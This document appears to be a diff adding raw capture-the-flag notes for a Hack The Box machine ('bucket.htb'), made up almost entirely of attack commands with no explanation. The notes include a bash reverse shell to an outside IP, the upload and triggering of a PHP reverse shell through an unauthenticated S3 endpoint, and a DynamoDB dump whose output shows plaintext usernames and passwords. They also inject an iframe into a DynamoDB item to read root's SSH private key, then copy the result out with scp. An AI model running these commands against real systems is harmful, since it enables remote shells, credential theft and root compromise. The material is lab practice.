@@ -1,0 +1,104 @@
+https://github.com/ehsahil/recon-my-way/tree/master/lazys3
+
+https://lobster1234.github.io/2017/04/05/working-with-localstack-command-line/
+
+aws --endpoint-url=http://bucket.htb s3 mb s3://mytestbucket
+
+aws --endpoint-url=http://s3.bucket.htb s3 mb s3://mytestbucket
+aws --endpoint-url=http://s3.bucket.htb s3 ls
+
+aws --endpoint-url=http://s3.bucket.htb s3 cp a.txt s3://mytestbucket
+
+curl -v http://s3.bucket.htb/mytestbucket/a.txt
+
+/bin/bash -c 'bash -i > /dev/tcp/10.10.14.104/1234 0>&1'
+
+https://github.com/ehsahil/recon-my-way/tree/master/lazys3
+
+https://lobster1234.github.io/2017/04/05/working-with-localstack-command-line/
+
+aws --endpoint-url=http://s3.bucket.htb s3 mb s3://mytestbucket
+
+aws --endpoint-url=http://bucket.htb s3 mb s3://mytestbucket
+
+aws --endpoint-url=http://s3.bucket.htb s3 mb s3://mytestbucket
+aws --endpoint-url=http://s3.bucket.htb s3 ls
+
+aws --endpoint-url=http://s3.bucket.htb s3 cp a.txt s3://mytestbucket
+
+curl -v http://s3.bucket.htb/mytestbucket/a.txt
+
+aws --endpoint-url=http://s3.bucket.htb s3 cp s3://adserver  . --recursive
+
+aws dynamodb list-tables --no-sign-request --endpoint-url http://s3.bucket.htb/
+
+aws dynamodb describe-table --table-name users --endpoint-url http://s3.bucket.htb/
+
+aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/
+
+
+aws --endpoint-url=http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver
+
+curl http://bucket.htb/php-reverse-shell.php
+
+
+http://bucket.htb/php-reverse-shell.php
+
+{
+"Items": [
+{
+"password": {
+"S": "Management@#1@#"
+},
+"username": {
+"S": "Mgmt"
+}
+},
+{
+"password": {
+"S": "Welcome123!"
+},
+"username": {
+"S": "Cloudadm"
+}
+},
+{
+"password": {
+"S": "n2vM-<_K_Q:.Aa2"
+},
+"username": {
+"S": "Sysadm"
+}
+}
+],
+"Count": 3,
+"ScannedCount": 3,
+"ConsumedCapacity": null
+}
+
+aws dynamodb create-table \
+    --table-name alerts \
+    --attribute-definitions \
+        AttributeName=title,AttributeType=S \
+        AttributeName=data,AttributeType=S \
+    --key-schema \
+        AttributeName=title,KeyType=HASH \
+        AttributeName=data,KeyType=RANGE \
+--provisioned-throughput \
+        ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb/
+
+aws dynamodb put-item \
+--table-name alerts  \
+--item '{
+    "title":{"S":  "Ransomware"},
+    "data": {"S": "<html><head></head><body><iframe src='file:///root/.ssh/id_rsa'></iframe></body></html"} }' --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb/
+
+
+aws dynamodb scan --table-name alerts --endpoint-url http://s3.bucket.htb/
+
+do in target - curl --data "action=get_alerts" http://127.0.0.1:8000/
+
+
+scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf .
+
+chmod 600 id_rsa
